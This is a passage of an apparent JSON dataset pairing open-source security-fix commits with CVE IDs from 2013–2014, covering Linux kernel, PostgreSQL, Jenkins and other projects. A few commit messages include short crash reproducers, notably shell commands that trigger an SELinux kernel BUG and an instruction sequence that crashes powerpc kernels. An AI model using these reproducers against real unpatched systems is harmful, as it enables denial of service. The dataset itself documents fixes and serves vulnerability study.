    "url": "https://github.com/dlitz/pycrypto/commit/8dbe0dc3eea5c689d4f76b37b93fe216cf1f00d4",
    "title": "Throw exception when IV is used with ECB or CTR",
    "body": "The IV parameter is currently ignored when initializinga cipher in ECB or CTR mode.For CTR mode, it is confusing: it takes some time to seethat a different parameter is needed (the counter).For ECB mode, it is outright dangerous.This patch forces an exception to be raised.",
    "cveIds": [
      "CVE-2013-7459"
    ],
    "cveIdsCount": 1
  },
  "502f01361372403bb36609bee66a1b0eb50bf80aec401e5dadce19cd5f291d5d": {
    "url": "https://github.com/mitsuhiko/jinja2/commit/acb672b6a179567632e032f547582f30fa2f4aa7",
    "title": "Fixed a security issue with temporary files on the filesystem cache o…",
    "body": "…n UNIX.",
    "cveIds": [
      "CVE-2014-0012"
    ],
    "cveIdsCount": 1
  },
  "fdc4017547974d7278e6d43ba450e2389fa54eb9025ab52de4177280e3407dba": {
    "url": "https://github.com/torvalds/linux/commit/2def2ef2ae5f3990aabdbe8a755911902707d268",
    "title": "x86, x32: Correct invalid use of user timespec in the kernel",
    "body": "The x32 case for the recvmsg() timout handling is broken: asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout) { int datagrams; struct timespec ktspec; if (flags & MSG_CMSG_COMPAT) return -EINVAL; if (COMPAT_USE_64BIT_TIME) return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen, flags | MSG_CMSG_COMPAT, (struct timespec *) timeout); ...The timeout pointer parameter is provided by userland (hence the __userannotation) but for x32 syscalls it's simply cast to a kernel pointerand is passed to __sys_recvmmsg which will eventually directlydereference it for both reading and writing. Other callers to__sys_recvmmsg properly copy from userland to the kernel first.The bug was introduced by commit ee4fa23 (\"compat: UseCOMPAT_USE_64BIT_TIME in net/compat.c\") and should affect all kernelssince 3.4 (and perhaps vendor kernels if they backported x32 supportalong with this code).Note that CONFIG_X86_X32_ABI gets enabled at build time and only ifCONFIG_X86_X32 is enabled and ld can build x32 executables.Other uses of COMPAT_USE_64BIT_TIME seem fine.This addresses CVE-2014-0038.Signed-off-by: PaX Team <pageexec@freemail.hu>Signed-off-by: H. Peter Anvin <hpa@linux.intel.com>Cc: <stable@vger.kernel.org> # v3.4+Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2014-0038"
    ],
    "cveIdsCount": 1
  },
  "e6824d1a89a734bfeaadb8baf722ea5416dc23ee0444502f61da99a4fba14673": {
    "url": "https://github.com/openstack/heat-templates/commit/65a4f8bebc72da71c616e2e378b7b1ac354db1a3",
    "title": "Secure private repo files added to environment",
    "body": "The yum repo files had insecure settings for sslverify andgpgcheck. Also change references to http to https.Change-Id: I10cbc33a734f9ed36ef6f22174c65efaf3b659d7",
    "cveIds": [
      "CVE-2014-0042"
    ],
    "cveIdsCount": 1
  },
  "adb2a2953f44497b754bb699b57182a45db5b63360b6a28f208d584d6b11a45f": {
    "url": "https://github.com/postgres/postgres/commit/4318daecc959886d001a6e79c6ea853e8b1dfb4b",
    "title": "Fix handling of wide datetime input/output.",
    "body": "Many server functions use the MAXDATELEN constant to size a buffer forparsing or displaying a datetime value. It was much too small for thelongest possible interval output and slightly too small for certainvalid timestamp input, particularly input with a long timezone name.The long input was rejected needlessly; the long output causedinterval_out() to overrun its buffer. ECPG's pgtypes library has a copyof the vulnerable functions, which bore the same vulnerabilities alongwith some of its own. In contrast to the server, certain long inputscaused stack overflow rather than failing cleanly. Back-patch to 8.4(all supported versions).Reported by Daniel Schüssler, reviewed by Tom Lane.Security: CVE-2014-0063",
    "cveIds": [
      "CVE-2014-0063"
    ],
    "cveIdsCount": 1
  },
  "c7d63f6f6e976a6666efa473aefe7c05428a8281bc386047987ffa756f758abd": {
    "url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a",
    "title": "Predict integer overflow to avoid buffer overruns.",
    "body": "Several functions, mostly type input functions, calculated an allocationsize such that the calculation wrapped to a small positive value whenarguments implied a sufficiently-large requirement. Writes past the endof the inadvertent small allocation followed shortly thereafter.Coverity identified the path_in() vulnerability; code inspection led tothe rest. In passing, add check_stack_depth() to prevent stack overflowin related functions.Back-patch to 8.4 (all supported versions). The non-comment hstorechanges touch code that did not exist in 8.4, so that part stops at 9.0.Noah Misch and Heikki Linnakangas, reviewed by Tom Lane.Security: CVE-2014-0064",
    "cveIds": [
      "CVE-2014-0064",
      "CVE-2014-2669"
    ],
    "cveIdsCount": 2
  },
  "fee3551b4610ca3ddb5b8ce0c8ef3b4de3dba067ef64227f616bfbbdd5a63671": {
    "url": "https://github.com/torvalds/linux/commit/5d81de8e8667da7135d3a32a964087c0faf5483f",
    "title": "cifs: ensure that uncached writes handle unmapped areas correctly",
    "body": "It's possible for userland to pass down an iovec via writev() that has abogus user pointer in it. If that happens and we're doing an uncachedwrite, then we can end up getting less bytes than we expect from thecall to iov_iter_copy_from_user. This is CVE-2014-0069cifs_iovec_write isn't set up to handle that situation however. It'llblindly keep chugging through the page array and not filling those pageswith anything useful. Worse yet, we'll later end up with a negativenumber in wdata->tailsz, which will confuse the sending routines andcause an oops at the very least.Fix this by having the copy phase of cifs_iovec_write stop copying datain this situation and send the last write as a short one. At the sametime, we want to avoid sending a zero-length write to the server, sobreak out of the loop and set rc to -EFAULT if that happens. This alsoallows us to handle the case where no address in the iovec is valid.[Note: Marking this for stable on v3.4+ kernels, but kernels as old as v2.6.38 may have a similar problem and may need similar fix]Cc: <stable@vger.kernel.org> # v3.4+Reviewed-by: Pavel Shilovsky <piastry@etersoft.ru>Reported-by: Al Viro <viro@zeniv.linux.org.uk>Signed-off-by: Jeff Layton <jlayton@redhat.com>Signed-off-by: Steve French <smfrench@gmail.com>",
    "cveIds": [
      "CVE-2014-0069"
    ],
    "cveIdsCount": 1
  },
  "6d6d6c7a42405385b89aed9fdc0728b9dd979e1510af61d18449707693b5fd46": {
    "url": "https://github.com/torvalds/linux/commit/d8316f3991d207fe32881a9ac20241be8fa2bad0",
    "title": "vhost: fix total length when packets are too short",
    "body": "When mergeable buffers are disabled, and theincoming packet is too large for the rx buffer,get_rx_bufs returns success.This was intentional in order for make recvmsgtruncate the packet and then handle_rx woulddetect err != sock_len and drop it.Unfortunately we pass the original sock_len torecvmsg - which means we use parts of iov not fullyvalidated.Fix this up by detecting this overrun and doing packet dropimmediately.CVE-2014-0077Signed-off-by: Michael S. Tsirkin <mst@redhat.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-0077"
    ],
    "cveIdsCount": 1
  },
  "4181b3330ff75941e83ac1835b022d1a3be93b76723e72f5315a2ba805bba98b": {
    "url": "https://github.com/torvalds/linux/commit/ec0223ec48a90cb605244b45f7c62de856403729",
    "title": "net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable",
    "body": "RFC4895 introduced AUTH chunks for SCTP; during the SCTPhandshake RANDOM; CHUNKS; HMAC-ALGO are negotiated (CHUNKSbeing optional though): ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ----------> <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] --------- -------------------- COOKIE-ECHO --------------------> <-------------------- COOKIE-ACK ---------------------A special case is when an endpoint requires COOKIE-ECHOchunks to be authenticated: ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ----------> <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] --------- ------------------ AUTH; COOKIE-ECHO ----------------> <-------------------- COOKIE-ACK ---------------------RFC4895, section 6.3. Receiving Authenticated Chunks says: The receiver MUST use the HMAC algorithm indicated in the HMAC Identifier field. If this algorithm was not specified by the receiver in the HMAC-ALGO parameter in the INIT or INIT-ACK chunk during association setup, the AUTH chunk and all the chunks after it MUST be discarded and an ERROR chunk SHOULD be sent with the error cause defined in Section 4.1. [...] If no endpoint pair shared key has been configured for that Shared Key Identifier, all authenticated chunks MUST be silently discarded. [...] When an endpoint requires COOKIE-ECHO chunks to be authenticated, some special procedures have to be followed because the reception of a COOKIE-ECHO chunk might result in the creation of an SCTP association. If a packet arrives containing an AUTH chunk as a first chunk, a COOKIE-ECHO chunk as the second chunk, and possibly more chunks after them, and the receiver does not have an STCB for that packet, then authentication is based on the contents of the COOKIE-ECHO chunk. In this situation, the receiver MUST authenticate the chunks in the packet by using the RANDOM parameters, CHUNKS parameters and HMAC_ALGO parameters obtained from the COOKIE-ECHO chunk, and possibly a local shared secret as inputs to the authentication procedure specified in Section 6.3. If authentication fails, then the packet is discarded. If the authentication is successful, the COOKIE-ECHO and all the chunks after the COOKIE-ECHO MUST be processed. If the receiver has an STCB, it MUST process the AUTH chunk as described above using the STCB from the existing association to authenticate the COOKIE-ECHO chunk and all the chunks after it. [...]Commit bbd0d59 introduced the possibility to receiveand verification of AUTH chunk, including the edge case forauthenticated COOKIE-ECHO. On reception of COOKIE-ECHO,the function sctp_sf_do_5_1D_ce() handles processing,unpacks and creates a new association if it passed sanitychecks and also tests for authentication chunks beingpresent. After a new association has been processed, itinvokes sctp_process_init() on the new association andwalks through the parameter list it received from the INITchunk. It checks SCTP_PARAM_RANDOM, SCTP_PARAM_HMAC_ALGOand SCTP_PARAM_CHUNKS, and copies them into asoc->peermeta data (peer_random, peer_hmacs, peer_chunks) in casesysctl -w net.sctp.auth_enable=1 is set. If in INIT'sSCTP_PARAM_SUPPORTED_EXT parameter SCTP_CID_AUTH is set,peer_random != NULL and peer_hmacs != NULL the peer is to beassumed asoc->peer.auth_capable=1, in any other caseasoc->peer.auth_capable=0.Now, if in sctp_sf_do_5_1D_ce() chunk->auth_chunk isavailable, we set up a fake auth chunk and pass that on tosctp_sf_authenticate(), which at latest insctp_auth_calculate_hmac() reliably dereferences a NULL pointerat position 0..0008 when setting up the crypto key incrypto_hash_setkey() by using asoc->asoc_shared_key that isNULL as condition key_id == asoc->active_key_id is true ifthe AUTH chunk was injected correctly from remote. Thishappens no matter what net.sctp.auth_enable sysctl says.The fix is to check for net->sctp.auth_enable and forasoc->peer.auth_capable before doing any operations likesctp_sf_authenticate() as no key is activated insctp_auth_asoc_init_active_key() for each case.Now as RFC4895 section 6.3 states that if the used HMAC-ALGOpassed from the INIT chunk was not used in the AUTH chunk, weSHOULD send an error; however in this case it would be betterto just silently discard such a maliciously prepared handshakeas we didn't even receive a parameter at all. Also, as ourendpoint has no shared key configured, section 6.3 says thatMUST silently discard, which we are doing from now onwards.Before calling sctp_sf_pdiscard(), we need not only to freethe association, but also the chunk->auth_chunk skb, ascommit bbd0d59 created a skb clone in that case.I have tested this locally by using netfilter's nfqueue andre-injecting packets into the local stack after maliciouslymodifying the INIT chunk (removing RANDOM; HMAC-ALGO param)and the SCTP packet containing the COOKIE_ECHO (injectingAUTH chunk before COOKIE_ECHO). Fixed with this patch applied.Fixes: bbd0d59 (\"[SCTP]: Implement the receive and verification of AUTH chunk\")Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Cc: Vlad Yasevich <yasevich@gmail.com>Cc: Neil Horman <nhorman@tuxdriver.com>Acked-by: Vlad Yasevich <vyasevich@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-0101"
    ],
    "cveIdsCount": 1
  },
  "098c64b38b7e4dc5a27713892c00de400bb28c79805f3deb256d0ca6f39053e2": {
    "url": "https://github.com/hawtio/hawtio/commit/b4e23e002639c274a2f687ada980118512f06113",
    "title": "Add a LoginTokenServlet that plugins can use to fetch a token, and le…",
    "body": "…t's use it in hawtio-karaf-terminal. Also handle cases where the terminal scope gets created a couple times.",
    "cveIds": [
      "CVE-2014-0120"
    ],
    "cveIdsCount": 1
  },
  "93678a097b228bd9d2a1c47c6148acdf0a953ff31bd9cd2691f0b4fa0188d1eb": {
    "url": "https://github.com/torvalds/linux/commit/1fd819ecb90cc9b822cd84d3056ddba315d3340f",
    "title": "skbuff: skb_segment: orphan frags before copying",
    "body": "skb_segment copies frags around, so we needto copy them carefully to avoid accessinguser memory after reporting completion to userspacethrough a callback.skb_segment doesn't normally happen on datapath:TSO needs to be disabled - so disabling zero copyin this case does not look like a big deal.Signed-off-by: Michael S. Tsirkin <mst@redhat.com>Acked-by: Herbert Xu <herbert@gondor.apana.org.au>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-0131"
    ],
    "cveIdsCount": 1
  },
  "86b2c3b01f14a62bfdbb9b5938def8d342aeb9290ec8cb59a8d2f0004b70819b": {
    "url": "https://github.com/rhuss/jolokia/commit/2d9b168cfbbf5a6d16fa6e8a5b34503e3dc42364",
    "title": "Enchanced policy wr to origin handling. The Origin: can now be checke…",
    "body": "…d on the server side, too.",
    "cveIds": [
      "CVE-2014-0168"
    ],
    "cveIdsCount": 1
  },
  "c436d11cc75b8fb3d4f6d5b78af273f10e825c424b8a111e06277c46857a7b85": {
    "url": "https://github.com/github/hub/commit/016ec99d25b1cb83cb4367e541177aa431beb600",
    "title": "Use non-predictable filename for downloaded patch file",
    "body": "Since the /tmp directory is readable by everybody on Unix, and sincethe patch name could be public or easy to guess, a attacker could create a symlinkto a file writable by the user running hub, which would be replaced by the patch.This has been assigned CVE-2014-0177",
    "cveIds": [
      "CVE-2014-0177"
    ],
    "cveIdsCount": 1
  },
  "d8d9d06105d87af29412f39ed4504954eb55478762102fc03c0ddea08ebacd9a": {
    "url": "https://github.com/torvalds/linux/commit/2145e15e0557a01b9195d1c7199a1b92cb9be81f",
    "title": "floppy: don't write kernel-only members to FDRAWCMD ioctl output",
    "body": "Do not leak kernel-only floppy_raw_cmd structure members to userspace.This includes the linked-list pointer and the pointer to the allocatedDMA space.Signed-off-by: Matthew Daley <mattd@bugfuzz.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2014-1738"
    ],
    "cveIdsCount": 1
  },
  "b1c6b2bdccbbb87f8e107fe0d91e0a8957152c9d038b3427556c0f153f423c74": {
    "url": "https://github.com/torvalds/linux/commit/e6a623460e5fc960ac3ee9f946d3106233fd28d8",
    "title": "[media] media-device: fix infoleak in ioctl media_enum_entities()",
    "body": "This fixes CVE-2014-1739.Signed-off-by: Salva Peiró <speiro@ai2.upv.es>Acked-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com>Cc: stable@vger.kernel.orgSigned-off-by: Mauro Carvalho Chehab <m.chehab@samsung.com>",
    "cveIds": [
      "CVE-2014-1739"
    ],
    "cveIdsCount": 1
  },
  "48d0fcc51d4051a47966369d1b6278ccceb2ec7c6d3f3ce1dd6c11a32f33c105": {
    "url": "https://github.com/numpy/numpy/commit/0bb46c1448b0d3f5453d5182a17ea7ac5854ee15",
    "title": "ENH: remove insecure mktemp use",
    "body": "mktemp only returns a filename, a malicous user could replace it beforeit gets used.",
    "cveIds": [
      "CVE-2014-1858"
    ],
    "cveIdsCount": 1
  },
  "2d6d1ff6ed935df43fefbd69bd28f4cfbabec84c5d06a0a2d78e207a49fc6251": {
    "url": "https://github.com/torvalds/linux/commit/2172fa709ab32ca60e86179dc67d0857be8e2c98",
    "title": "SELinux: Fix kernel BUG on empty security contexts.",
    "body": "Setting an empty security context (length=0) on a file willlead to incorrectly dereferencing the type and other fieldsof the security context structure, yielding a kernel BUG.As a zero-length security context is never valid, just rejectall such security contexts whether coming from userspacevia setxattr or coming from the filesystem upon a getxattrrequest by SELinux.Setting a security context value (empty or otherwise) unknown toSELinux in the first place is only possible for a root process(CAP_MAC_ADMIN), and, if running SELinux in enforcing mode, onlyif the corresponding SELinux mac_admin permission is also grantedto the domain by policy. In Fedora policies, this is only allowed forspecific domains such as livecd for setting down security contextsthat are not defined in the build host policy.Reproducer:susetenforce 0touch foosetfattr -n security.selinux fooCaveat:Relabeling or removing foo after doing the above may not be possiblewithout booting with SELinux disabled. Any subsequent access to fooafter doing the above will also trigger the BUG.BUG output from Matthew Thode:[ 473.893141] ------------[ cut here ]------------[ 473.962110] kernel BUG at security/selinux/ss/services.c:654![ 473.995314] invalid opcode: 0000 [#6] SMP[ 474.027196] Modules linked in:[ 474.058118] CPU: 0 PID: 8138 Comm: ls Tainted: G D I3.13.0-grsec #1[ 474.116637] Hardware name: Supermicro X8ST3/X8ST3, BIOS 2.007/29/10[ 474.149768] task: ffff8805f50cd010 ti: ffff8805f50cd488 task.ti:ffff8805f50cd488[ 474.183707] RIP: 0010:[<ffffffff814681c7>] [<ffffffff814681c7>]context_struct_compute_av+0xce/0x308[ 474.219954] RSP: 0018:ffff8805c0ac3c38 EFLAGS: 00010246[ 474.252253] RAX: 0000000000000000 RBX: ffff8805c0ac3d94 RCX:0000000000000100[ 474.287018] RDX: ffff8805e8aac000 RSI: 00000000ffffffff RDI:ffff8805e8aaa000[ 474.321199] RBP: ffff8805c0ac3cb8 R08: 0000000000000010 R09:0000000000000006[ 474.357446] R10: 0000000000000000 R11: ffff8805c567a000 R12:0000000000000006[ 474.419191] R13: ffff8805c2b74e88 R14: 00000000000001da R15:0000000000000000[ 474.453816] FS: 00007f2e75220800(0000) GS:ffff88061fc00000(0000)knlGS:0000000000000000[ 474.489254] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033[ 474.522215] CR2: 00007f2e74716090 CR3: 00000005c085e000 CR4:00000000000207f0[ 474.556058] Stack:[ 474.584325] ffff8805c0ac3c98 ffffffff811b549b ffff8805c0ac3c98ffff8805f1190a40[ 474.618913] ffff8805a6202f08 ffff8805c2b74e88 00068800d0464990ffff8805e8aac860[ 474.653955] ffff8805c0ac3cb8 000700068113833a ffff880606c75060ffff8805c0ac3d94[ 474.690461] Call Trace:[ 474.723779] [<ffffffff811b549b>] ? lookup_fast+0x1cd/0x22a[ 474.778049] [<ffffffff81468824>] security_compute_av+0xf4/0x20b[ 474.811398] [<ffffffff8196f419>] avc_compute_av+0x2a/0x179[ 474.843813] [<ffffffff8145727b>] avc_has_perm+0x45/0xf4[ 474.875694] [<ffffffff81457d0e>] inode_has_perm+0x2a/0x31[ 474.907370] [<ffffffff81457e76>] selinux_inode_getattr+0x3c/0x3e[ 474.938726] [<ffffffff81455cf6>] security_inode_getattr+0x1b/0x22[ 474.970036] [<ffffffff811b057d>] vfs_getattr+0x19/0x2d[ 475.000618] [<ffffffff811b05e5>] vfs_fstatat+0x54/0x91[ 475.030402] [<ffffffff811b063b>] vfs_lstat+0x19/0x1b[ 475.061097] [<ffffffff811b077e>] SyS_newlstat+0x15/0x30[ 475.094595] [<ffffffff8113c5c1>] ? __audit_syscall_entry+0xa1/0xc3[ 475.148405] [<ffffffff8197791e>] system_call_fastpath+0x16/0x1b[ 475.179201] Code: 00 48 85 c0 48 89 45 b8 75 02 0f 0b 48 8b 45 a0 488b 3d 45 d0 b6 00 8b 40 08 89 c6 ff ce e8 d1 b0 06 00 48 85 c0 49 89 c775 02 <0f> 0b 48 8b 45 b8 4c 8b 28 eb 1e 49 8d 7d 08 be 80 01 00 00 e8[ 475.255884] RIP [<ffffffff814681c7>]context_struct_compute_av+0xce/0x308[ 475.296120] RSP <ffff8805c0ac3c38>[ 475.328734] ---[ end trace f076482e9d754adc ]---Reported-by: Matthew Thode <mthode@mthode.org>Signed-off-by: Stephen Smalley <sds@tycho.nsa.gov>Cc: stable@vger.kernel.orgSigned-off-by: Paul Moore <pmoore@redhat.com>",
    "cveIds": [
      "CVE-2014-1874"
    ],
    "cveIdsCount": 1
  },
  "cf04b1b72165c2fe6ed10715ebb4ecd1d3defab3c570459f81dab3ec9948ae29": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/968d5d5f486820bfa30af046f063b9f23304e14a",
    "title": "Sanitize filename in import message",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2014-1879"
    ],
    "cveIdsCount": 1
  },
  "19ef4190a1c7a091689741c3a03da1de4418624835611a87900931a611bdec87": {
    "url": "https://github.com/spring-projects/spring-framework/commit/741b4b229ae032bd17175b46f98673ce0bd2d485",
    "title": "Add encoding for the default action in FormTag",
    "body": "Issue: SPR-11426",
    "cveIds": [
      "CVE-2014-1904"
    ],
    "cveIdsCount": 1
  },
  "34970b2df2f694e51ca2f3787d1187b9f2d85f35cecb8c59f453f6c77565fa3a": {
    "url": "https://github.com/python-imaging/Pillow/commit/4e9f367dfd3f04c8f5d23f7f759ec12782e10ee7",
    "title": "Removed tempfile.mktemp, fixes CVE-2014-1932 CVE-2014-1933, debian bu…",
    "body": "…g #737059",
    "cveIds": [
      "CVE-2014-1933"
    ],
    "cveIdsCount": 1
  },
  "49ff49acf50a5e002d27f401886485bb1bd2973de1e62650e2af65dd2c3be12f": {
    "url": "https://github.com/redmine/redmine/commit/7567c3d8b21fe67e5f04e6839c1fce061600f2f3",
    "title": "Fixed back url verification (#16466).",
    "body": "git-svn-id: http://svn.redmine.org/redmine/trunk@13018 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2014-1985"
    ],
    "cveIdsCount": 1
  },
  "8941c3dce534f4c19bba515a9d9d24f10768c209a2bb85b12adb9585dab9abaa": {
    "url": "https://github.com/php/php-src/commit/2938329ce19cb8c4197dec146c3ec887c6f61d01",
    "title": "Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())",
    "body": "And also fixed the bug: arguments are altered after some calls",
    "cveIds": [
      "CVE-2014-2020"
    ],
    "cveIdsCount": 1
  },
  "a8b2170f65a1401f2f8931367934b36efb9a6f1654a4e9501c29fb3bb1f693d8": {
    "url": "https://github.com/torvalds/linux/commit/263b4509ec4d47e0da3e753f85a39ea12d1eff24",
    "title": "nfs: always make sure page is up-to-date before extending a write to …",
    "body": "…cover the entire pageWe should always make sure the cached page is up-to-date when we'redetermining whether we can extend a write to cover the full page -- evenif we've received a write delegation from the server.Commit c755966 added logic to skip this check if we have a writedelegation, which can lead to data corruption such as the followingscenario if client B receives a write delegation from the NFS server:Client A: # echo 123456789 > /mnt/fileClient B: # echo abcdefghi >> /mnt/file # cat /mnt/file 0�D0�abcdefghiJust because we hold a write delegation doesn't mean that we've read inthe entire page contents.Cc: <stable@vger.kernel.org> # v3.11+Signed-off-by: Scott Mayhew <smayhew@redhat.com>Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>",
    "cveIds": [
      "CVE-2014-2038"
    ],
    "cveIdsCount": 1
  },
  "99df9751a80353da6264bb4d3f8445b3338b621e2cdb849cc9ad05bc01c57079": {
    "url": "https://github.com/torvalds/linux/commit/8d7f6690cedb83456edd41c9bd583783f0703bf0",
    "title": "s390: fix kernel crash due to linkage stack instructions",
    "body": "The kernel currently crashes with a low-address-protection exceptionif a user space process executes an instruction that tries to use thelinkage stack. Set the base-ASTE origin and the subspace-ASTE originof the dispatchable-unit-control-table to point to a dummy ASTE.Set up control register 15 to point to an empty linkage stack with noroom left.A user space process with a linkage stack instruction will still crashbut with a different exception which is correctly translated to asegmentation fault instead of a kernel oops.Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>",
    "cveIds": [
      "CVE-2014-2039"
    ],
    "cveIdsCount": 1
  },
  "be9c69b6489a747dc5137d0ad6ad3839b272562b01d56d314757a40c8d9f66a6": {
    "url": "https://github.com/jenkinsci/jenkins/commit/b6b2a367a7976be80a799c6a49fa6c58d778b50e",
    "title": "[FIXED SECURITY-109] SECURITY-55 fix to BuildTrigger configuration fa…",
    "body": "…iled if downstream project was not visible.",
    "cveIds": [
      "CVE-2014-2058"
    ],
    "cveIdsCount": 1
  },
  "b13d95cb8256d9ecddf9dfcd2d3d7a127ecbe145a24a6d99b09a04e0b9e45f65": {
    "url": "https://github.com/jenkinsci/jenkins/commit/bf539198564a1108b7b71a973bf7de963a6213ef",
    "title": "[FIXED SECURITY-93] PasswordParameterDefinition should serve existing…",
    "body": "… default value in encrypted form.And strengthen functional tests (using configRoundTrip) to ensure that the same mistake is not made elsewhere.",
    "cveIds": [
      "CVE-2014-2061"
    ],
    "cveIdsCount": 1
  },
  "c248ca6d81f42f53caf35fb0dd3e56d180faf29dfa2f7c6d9e229c49067144ac": {
    "url": "https://github.com/jenkinsci/jenkins/commit/5548b5220cfd496831b5721124189ff18fbb12a3",
    "title": "[FIXED SECURITY-89] When checking an API token, verify that the user …",
    "body": "…actually exists.",
    "cveIds": [
      "CVE-2014-2062"
    ],
    "cveIdsCount": 1
  },
  "bfff00cb9d8f0acd984429a2b51354ac3062d6caa23137eaf31fbae70bf62441": {
    "url": "https://github.com/jenkinsci/jenkins/commit/fbf96734470caba9364f04e0b77b0bae7293a1ec",
    "title": "[FIXED SECURITY-79] Prevent (private security realm) usernames from b…",
    "body": "…eing guessed.",
    "cveIds": [
      "CVE-2014-2064"
    ],
    "cveIdsCount": 1
  },
  "68f181f1c0f681ee105fb8f5062f9977fef855cd5d5b7b021d268d4e5d1557b0": {
    "url": "https://github.com/jenkinsci/jenkins/commit/8ac74c350779921598f9d5edfed39dd35de8842a",
    "title": "[FIXED SECURITY-75] Invalidate session after login to avoid session f…",
    "body": "…ixation",
    "cveIds": [
      "CVE-2014-2066"
    ],
    "cveIdsCount": 1
  },
  "f9e25ef3302e2fbc5e89040273498a236dedd84a75c6461029a2115a29a4c739": {
    "url": "https://github.com/modxcms/revolution/commit/77463eb6a8090f474b04fdc1b72225cb93c558ea",
    "title": "Prevent XSS on actionVar in header.tpl",
    "body": "The smarty template was reflecting the $_GET['a'] parameter without converting htmlspecialchars (was only using strip_tags)",
    "cveIds": [
      "CVE-2014-2080"
    ],
    "cveIdsCount": 1
  },
  "e283f44d8fc6636be6e008260791d13614061c867135cee6a0beb77518d0f20a": {
    "url": "https://github.com/facebook/hhvm/commit/506a44194a9016406c752ad8e010c01aeffc18cc",
    "title": "Fix escaping in LightProcess protocol",
    "body": "The LightProcess mechanism sends newline terminated commandsover a pipe, but didn't escape newlines contained in the payload.Reviewed By: ottoDifferential Revision: D1184482",
    "cveIds": [
      "CVE-2014-2208"
    ],
    "cveIdsCount": 1
  },
  "974b36baee172beffdec38774b657a90e21c0350193aa24c807b7d2652316c6e": {
    "url": "https://github.com/facebook/hhvm/commit/851fff90a9b7461df2393af32239ba217bc25946",
    "title": "Drop supplementary groups when changing to non-root",
    "body": "Summary: When running HHVM as a non-root user, UID and GID are updated correctly but supplementary groups are not dropped properly. This runs initgroups inside main thread and lightprocess threads to reset groups to those of the specified non-root user.Reviewed By: @markw65Differential Revision: D1193229",
    "cveIds": [
      "CVE-2014-2209"
    ],
    "cveIdsCount": 1
  },
  "8e30e374528bc6d45181a9e577967bf335d65ce989382199c01a4ef48bd38275": {
    "url": "https://github.com/torvalds/linux/commit/b22f5126a24b3b2f15448c3f2a254fc10cbc2b92",
    "title": "netfilter: nf_conntrack_dccp: fix skb_header_pointer API usages",
    "body": "Some occurences in the netfilter tree use skb_header_pointer() inthe following way ... struct dccp_hdr _dh, *dh; ... skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);... where dh itself is a pointer that is being passed as the copybuffer. Instead, we need to use &_dh as the forth argument so thatwe're copying the data into an actual buffer that sits on the stack.Currently, we probably could overwrite memory on the stack (e.g.with a possibly mal-formed DCCP packet), but unintentionally, aswe only want the buffer to be placed into _dh variable.Fixes: 2bc7804 (\"[NETFILTER]: nf_conntrack: add DCCP protocol support\")Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2014-2523"
    ],
    "cveIdsCount": 1
  },
  "501b063c668b9e57aa15f1f7a1db23508afebfc78aa1c868e1eedea1e8244257": {
    "url": "https://github.com/brookinsconsulting/bccie/commit/d11811baccf265ff567dddca03cac70b65838a4f",
    "title": "Updated: Commented out role policy override settings for greater defa…",
    "body": "…ult security of cie information",
    "cveIds": [
      "CVE-2014-2552"
    ],
    "cveIdsCount": 1
  },
  "33fe541e42496a6600b2b16bf0544fce34d094cf28cc2ed7ca15e8faeb5c30ab": {
    "url": "https://github.com/jktjkt/trojita/commit/25fffa3e25cbad85bbca804193ad336b090a9ce1",
    "title": "IMAP: refuse to work when STARTTLS is required but server sends PREAUTH",
    "body": "Oops, we cannot send STARTTLS when the connection is already authenticated.This is serious enough to warrant an error; an attacker might be going after aplaintext of a message we're going to APPEND, etc.Thanks to Arnt Gulbrandsen on the imap-protocol ML for asking what happens whenwe're configured to request STARTTLS and a PREAUTH is received, and to Michael MSlusarz for starting that discussion.Hope the error message is readable enough.CVE: CVE-2014-2567",
    "cveIds": [
      "CVE-2014-2567"
    ],
    "cveIdsCount": 1
  },
  "27074fc24019b4f6405fa955cc6790c360a3aa93d9c29c14ab634b6a73d8f63c": {
    "url": "https://github.com/torvalds/linux/commit/621b5060e823301d0cba4cb52a7ee3491922d291",
    "title": "powerpc/tm: Fix crash when forking inside a transaction",
    "body": "When we fork/clone we currently don't copy any of the TM state to the newthread. This results in a TM bad thing (program check) when the new process isswitched in as the kernel does a tmrechkpt with TEXASR FS not set. Also, sinceR1 is from userspace, we trigger the bad kernel stack pointer detection. So weend up with something like this: Bad kernel stack pointer 0 at c0000000000404fc cpu 0x2: Vector: 700 (Program Check) at [c00000003ffefd40] pc: c0000000000404fc: restore_gprs+0xc0/0x148 lr: 0000000000000000 sp: 0 msr: 9000000100201030 current = 0xc000001dd1417c30 paca = 0xc00000000fe00800 softe: 0 irq_happened: 0x01 pid = 0, comm = swapper/2 WARNING: exception is not recoverable, can't continueThe below fixes this by flushing the TM state before we copy the task_struct tothe clone. To do this we go through the tmreclaim patch, which removes thecheckpointed registers from the CPU and transitions the CPU out of TM suspendmode. Hence we need to call tmrechkpt after to restore the checkpointed stateand the TM mode for the current task.To make this fail from userspace is simply:tbeginlir0, 2sc<boom>Kudos to 